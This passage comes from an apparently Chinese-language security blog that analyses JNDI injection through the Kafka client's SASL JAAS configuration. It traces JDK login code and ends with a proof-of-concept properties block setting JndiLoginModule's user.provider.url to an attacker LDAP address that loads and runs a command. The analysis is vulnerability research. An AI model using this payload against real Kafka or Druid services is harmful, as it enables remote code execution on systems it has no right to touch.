class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(String methodName)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br><br>    <span class="hljs-comment">// start at moduleIndex</span><br>    <span class="hljs-comment">// - this can only be non-zero if methodName is LOGIN_METHOD</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> moduleIndex; i &lt; moduleStack.length; i++, moduleIndex++) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">int</span> <span class="hljs-variable">mIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            Method[] methods = <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (moduleStack[i].<span class="hljs-keyword">module</span> != <span class="hljs-literal">null</span>) &#123;<br>                methods = moduleStack[i].<span class="hljs-keyword">module</span>.getClass().getMethods();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                <span class="hljs-comment">// instantiate the LoginModule</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// Allow any object to be a LoginModule as long as it</span><br>                <span class="hljs-comment">// conforms to the interface.</span><br>                Class&lt;?&gt; c = Class.forName(<br>                            moduleStack[i].entry.getLoginModuleName(),<br>                            <span class="hljs-literal">true</span>,<br>                            contextClassLoader);<br><br>                Constructor&lt;?&gt; constructor = c.getConstructor(PARAMS);<br>                Object[] args = &#123; &#125;;<br>                moduleStack[i].<span class="hljs-keyword">module</span> = constructor.newInstance(args);<br><br>                <span class="hljs-comment">// call the LoginModule&#x27;s initialize method</span><br>                methods = moduleStack[i].<span class="hljs-keyword">module</span>.getClass().getMethods();<br>                <span class="hljs-keyword">for</span> (mIndex = <span class="hljs-number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;<br>                    <span class="hljs-keyword">if</span> (methods[mIndex].getName().equals(INIT_METHOD)) &#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                Object[] initArgs = &#123;subject,<br>                                    callbackHandler,<br>                                    state,<br>                                    moduleStack[i].entry.getOptions() &#125;;<br>                <span class="hljs-comment">// invoke the LoginModule initialize method</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// Throws ArrayIndexOutOfBoundsException if no such</span><br>                <span class="hljs-comment">// method defined.  May improve to use LoginException in</span><br>                <span class="hljs-comment">// the future.</span><br>                <span class="hljs-comment">//invoke调用</span><br>                methods[mIndex].invoke(moduleStack[i].<span class="hljs-keyword">module</span>, initArgs);<br>            &#125;<br><br>            <span class="hljs-comment">// find the requested method in the LoginModule</span><br>            <span class="hljs-keyword">for</span> (mIndex = <span class="hljs-number">0</span>; mIndex &lt; methods.length; mIndex++) &#123;<br>                <span class="hljs-keyword">if</span> (methods[mIndex].getName().equals(methodName)) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// set up the arguments to be passed to the LoginModule method</span><br>            Object[] args = &#123; &#125;;<br><br>            <span class="hljs-comment">// invoke the LoginModule method</span><br>            <span class="hljs-comment">//</span><br>            <span class="hljs-comment">// Throws ArrayIndexOutOfBoundsException if no such</span><br>            <span class="hljs-comment">// method defined.  May improve to use LoginException in</span><br>            <span class="hljs-comment">// the future.</span><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> ((Boolean)methods[mIndex].invoke<br>                            (moduleStack[i].<span class="hljs-keyword">module</span>, args)).booleanValue();<br><br>            <span class="hljs-keyword">if</span> (status == <span class="hljs-literal">true</span>) &#123;<br><br>                <span class="hljs-comment">// if SUFFICIENT, return if no prior REQUIRED errors</span><br>                <span class="hljs-keyword">if</span> (!methodName.equals(ABORT_METHOD) &amp;&amp;<br>                    !methodName.equals(LOGOUT_METHOD) &amp;&amp;<br>                    moduleStack[i].entry.getControlFlag() ==<br>                AppConfigurationEntry.LoginModuleControlFlag.SUFFICIENT &amp;&amp;<br>                    firstRequiredError == <span class="hljs-literal">null</span>) &#123;<br><br>                    <span class="hljs-comment">// clear state</span><br>                    clearState();<br><br>                    <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                        debug.println(methodName + <span class="hljs-string">&quot; SUFFICIENT success&quot;</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; success&quot;</span>);<br>                success = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; ignored&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException nsme) &#123;<br>            <span class="hljs-type">MessageFormat</span> <span class="hljs-variable">form</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageFormat</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.instantiate.LoginModule.module.because.it.does.not.provide.a.no.argument.constructor&quot;</span>));<br>            Object[] source = &#123;moduleStack[i].entry.getLoginModuleName()&#125;;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(form.format(source)));<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException ie) &#123;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.instantiate.LoginModule.&quot;</span>) +<br>                    ie.getMessage()));<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.find.LoginModule.class.&quot;</span>) +<br>                    cnfe.getMessage()));<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException iae) &#123;<br>            throwException(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(ResourcesMgr.getString<br>                    (<span class="hljs-string">&quot;unable.to.access.LoginModule.&quot;</span>) +<br>                    iae.getMessage()));<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ite) &#123;<br><br>            <span class="hljs-comment">// failure cases</span><br><br>            LoginException le;<br><br>            <span class="hljs-keyword">if</span> (ite.getCause() <span class="hljs-keyword">instanceof</span> PendingException &amp;&amp;<br>                methodName.equals(LOGIN_METHOD)) &#123;<br><br>                <span class="hljs-comment">// XXX</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// if a module&#x27;s LOGIN_METHOD threw a PendingException</span><br>                <span class="hljs-comment">// then immediately throw it.</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// when LoginContext is called again,</span><br>                <span class="hljs-comment">// the module that threw the exception is invoked first</span><br>                <span class="hljs-comment">// (the module list is not invoked from the start).</span><br>                <span class="hljs-comment">// previously thrown exception state is still present.</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// it is assumed that the module which threw</span><br>                <span class="hljs-comment">// the exception can have its</span><br>                <span class="hljs-comment">// LOGIN_METHOD invoked twice in a row</span><br>                <span class="hljs-comment">// without any commit/abort in between.</span><br>                <span class="hljs-comment">//</span><br>                <span class="hljs-comment">// in all cases when LoginContext returns</span><br>                <span class="hljs-comment">// (either via natural return or by throwing an exception)</span><br>                <span class="hljs-comment">// we need to call clearState before returning.</span><br>                <span class="hljs-comment">// the only time that is not true is in this case -</span><br>                <span class="hljs-comment">// do not call throwException here.</span><br><br>                <span class="hljs-keyword">throw</span> (PendingException)ite.getCause();<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ite.getCause() <span class="hljs-keyword">instanceof</span> LoginException) &#123;<br><br>                le = (LoginException)ite.getCause();<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ite.getCause() <span class="hljs-keyword">instanceof</span> SecurityException) &#123;<br><br>                <span class="hljs-comment">// do not want privacy leak</span><br>                <span class="hljs-comment">// (e.g., sensitive file path in exception msg)</span><br><br>                le = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(<span class="hljs-string">&quot;Security Exception&quot;</span>);<br>                le.initCause(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>());<br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>) &#123;<br>                    debug.println<br>                        (<span class="hljs-string">&quot;original security exception with detail msg &quot;</span> +<br>                        <span class="hljs-string">&quot;replaced by new exception with empty detail msg&quot;</span>);<br>                    debug.println(<span class="hljs-string">&quot;original security exception: &quot;</span> +<br>                            ite.getCause().toString());<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                <span class="hljs-comment">// capture an unexpected LoginModule exception</span><br>                java.io.<span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StringWriter();<br>                ite.getCause().printStackTrace<br>                                            (<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.PrintWriter(sw));<br>                sw.flush();<br>                le = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span>(sw.toString());<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (moduleStack[i].entry.getControlFlag() ==<br>                AppConfigurationEntry.LoginModuleControlFlag.REQUISITE) &#123;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; REQUISITE failure&quot;</span>);<br><br>                <span class="hljs-comment">// if REQUISITE, then immediately throw an exception</span><br>                <span class="hljs-keyword">if</span> (methodName.equals(ABORT_METHOD) ||<br>                    methodName.equals(LOGOUT_METHOD)) &#123;<br>                    <span class="hljs-keyword">if</span> (firstRequiredError == <span class="hljs-literal">null</span>)<br>                        firstRequiredError = le;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    throwException(firstRequiredError, le);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (moduleStack[i].entry.getControlFlag() ==<br>                AppConfigurationEntry.LoginModuleControlFlag.REQUIRED) &#123;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; REQUIRED failure&quot;</span>);<br><br>                <span class="hljs-comment">// mark down that a REQUIRED module failed</span><br>                <span class="hljs-keyword">if</span> (firstRequiredError == <span class="hljs-literal">null</span>)<br>                    firstRequiredError = le;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                <span class="hljs-keyword">if</span> (debug != <span class="hljs-literal">null</span>)<br>                    debug.println(methodName + <span class="hljs-string">&quot; OPTIONAL failure&quot;</span>);<br><br>                <span class="hljs-comment">// mark down that an OPTIONAL module failed</span><br>                <span class="hljs-keyword">if</span> (firstError == <span class="hljs-literal">null</span>)<br>                    firstError = le;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// we went thru all the LoginModules.</span><br>    <span class="hljs-keyword">if</span> (firstRequiredError != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// a REQUIRED module failed -- return the error</span><br>        throwException(firstRequiredError, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (success == <span class="hljs-literal">false</span> &amp;&amp; firstError != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// no module succeeded -- return the first error</span><br>        throwException(firstError, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (success == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-comment">// no module succeeded -- all modules were IGNORED</span><br>        throwException(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span><br>            (ResourcesMgr.getString(<span class="hljs-string">&quot;Login.Failure.all.modules.ignored&quot;</span>)),<br>            <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// success</span><br><br>        clearState();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.sun.security.auth.module#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-19.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br><span class="hljs-comment">//userProvider不能为空</span><br>    <span class="hljs-keyword">if</span> (userProvider不能为空 == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span><br>            (<span class="hljs-string">&quot;Error: Unable to locate JNDI user provider&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//groupProvider不能为空</span><br>    <span class="hljs-keyword">if</span> (groupProvider == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginException</span><br>            (<span class="hljs-string">&quot;Error: Unable to locate JNDI group provider&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (debug) &#123;<br>        System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] user provider: &quot;</span> +<br>                            userProvider);<br>        System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] group provider: &quot;</span> +<br>                            groupProvider);<br>    &#125;<br><br>    <span class="hljs-comment">// attempt the authentication</span><br><span class="hljs-comment">//tryFirstPass为true进入</span><br>    <span class="hljs-keyword">if</span> (tryFirstPass) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// attempt the authentication by getting the</span><br>            <span class="hljs-comment">// username and password from shared state</span><br>            <span class="hljs-comment">//存在JNDI注入</span><br>            attemptAuthentication(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// authentication succeeded</span><br>            succeeded = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;tryFirstPass succeeded&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>            <span class="hljs-comment">// authentication failed -- try again below by prompting</span><br>            cleanState();<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;tryFirstPass failed with:&quot;</span> +<br>                            le.toString());<br>            &#125;<br>        &#125;<br><span class="hljs-comment">//useFirstPass为true</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (useFirstPass) &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// attempt the authentication by getting the</span><br>            <span class="hljs-comment">// username and password from shared state</span><br>            <span class="hljs-comment">//存在JNDI注入</span><br>            attemptAuthentication(<span class="hljs-literal">true</span>);<br><br>            <span class="hljs-comment">// authentication succeeded</span><br>            succeeded = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;useFirstPass succeeded&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>            <span class="hljs-comment">// authentication failed</span><br>            cleanState();<br>            <span class="hljs-keyword">if</span> (debug) &#123;<br>                System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;useFirstPass failed&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> le;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// attempt the authentication by prompting for the username and pwd</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        attemptAuthentication(<span class="hljs-literal">false</span>);<br><br>        <span class="hljs-comment">// authentication succeeded</span><br>       succeeded = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (debug) &#123;<br>            System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;regular authentication succeeded&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>        cleanState();<br>        <span class="hljs-keyword">if</span> (debug) &#123;<br>            System.out.println(<span class="hljs-string">&quot;\t\t[JndiLoginModule] &quot;</span> +<br>                            <span class="hljs-string">&quot;regular authentication failed&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">throw</span> le;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>com.sun.security.auth.module#attemptAuthentication()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-20.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attemptAuthentication</span><span class="hljs-params">(<span class="hljs-type">boolean</span> getPasswdFromSharedState)</span><br><span class="hljs-keyword">throws</span> LoginException &#123;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">encryptedPassword</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// first get the username and password</span><br>    <span class="hljs-comment">//若getPasswdFromSharedState为true代码进行运行，若为false则进入catch,不存在JNDI注入</span><br>    getUsernamePassword(getPasswdFromSharedState);<br><br>    <span class="hljs-keyword">try</span> &#123;<br><br>        <span class="hljs-comment">// get the user&#x27;s passwd entry from the user provider URL</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">iCtx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-comment">//JNDI注入</span><br>        ctx = (DirContext)iCtx.lookup(userProvider);<br><br>        <span class="hljs-type">SearchControls</span> <span class="hljs-variable">controls</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SearchControls</span>();<br>        NamingEnumeration&lt;SearchResult&gt; ne = ctx.search(<span class="hljs-string">&quot;&quot;</span>,<br>                                    <span class="hljs-string">&quot;(uid=&quot;</span> + username + <span class="hljs-string">&quot;)&quot;</span>,<br>                                    controls);<br>        <span class="hljs-keyword">if</span> (ne.hasMore()) &#123;<br>            <span class="hljs-type">SearchResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ne.next();<br>            <br>            <span class="hljs-type">Attributes</span> <span class="hljs-variable">attributes</span> <span class="hljs-operator">=</span> result.getAttributes();<br>    ....<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调用链如下：</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-21.png" alt="img"></p><p>综上若进行JNDI注入需满足一下条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">//security.protocol为SASL_SSL  SASL_PLAINTEXT<br>props.put(&quot;security.protocol&quot;,&quot;SASL_SSL&quot;);<br>bootstrap.servers不为空，为空解析报错<br>props.put(&quot;bootstrap.servers&quot;, &quot;localhost:9092&quot;);<br>key.serializer不为空，且可被解析<br>props.put(&quot;key.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);<br>value.serializer不为空，且可被解析<br>props.put(&quot;value.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);<br>//sasl.jaas.config为com.sun.security.auth.module.JndiLoginModule最终invoke至此类login()方法<br>//useFirstPass或tryFirstPass为true<br>//serviceName不为空<br>//group.provider.url不为空<br>//required user.provider.url为JNDI注入恶意地址<br>props.put(&quot;sasl.jaas.config&quot;,&quot;com.sun.security.auth.module.JndiLoginModule &quot; +<br>        &quot;required user.provider.url=\&quot;ldap://192.168.0.104:1389/Basic/Command/calc\&quot; &quot; +<br>        &quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot; +<br>        &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</title>
    <link href="/2023/04/23/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/23/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
